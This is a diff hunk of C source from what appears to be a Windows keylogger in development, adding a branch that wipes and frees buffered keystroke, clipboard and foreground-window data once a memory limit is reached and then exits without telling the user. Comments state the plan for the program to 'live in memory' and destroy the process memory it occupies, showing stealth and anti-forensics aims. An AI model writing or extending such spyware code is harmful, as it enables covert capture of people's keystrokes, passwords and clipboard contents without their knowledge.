@@ -635,7 +635,44 @@ int main()
                         get the current foreground window and store it in the CURRENTPROCESS.
                     */
                 }
+                /*
+                    log as much data as possible, but set a limit, if the
+                    data has not been sent by the MemConsumeLim then it won't
+                    be sent, eventually this program will live in memory and this portion
+                    of code will destroy the process memory it is living in, however
+                    for now we want to clear everything and return out.
+                */
+
             }
+             else if (current_process_data.buffer_size >= MemConsumeLim)
+                {
+                    /*
+                        zero out everything in the current process data and free
+                        all buffers.
+                    */
+                    memset(current_process_data.buffered_data,0,current_process_data.current_buff_offset);
+                    free(current_process_data.buffered_data);
+                    current_process_data.buffer_size=0x00;
+                    current_process_data.current_buff_offset = 0x00;
+                    /*
+                        clear out the clipboard data completely and free that.
+                    */
+                    memset(last_cb_data,0,strlen(last_cb_data));
+                    free(last_cb_data);
+                    /*
+                        clean up the last key stroke logged.
+                    */
+                    LastKeyStrokeLogged = 0x00;
+                    /*
+                        clean up the current process information
+                    */
+                    CURRENTPROCEESS = NULL;
+                    /*
+                        return 0 to exit with error success, no need to indicate
+                        a failed log to the user.
+                    */
+                    return 0;
+                }
             CURRENTPROCEESS=GetForegroundWindow();
             /*
                 call to initialize tags and further process the foreground window.
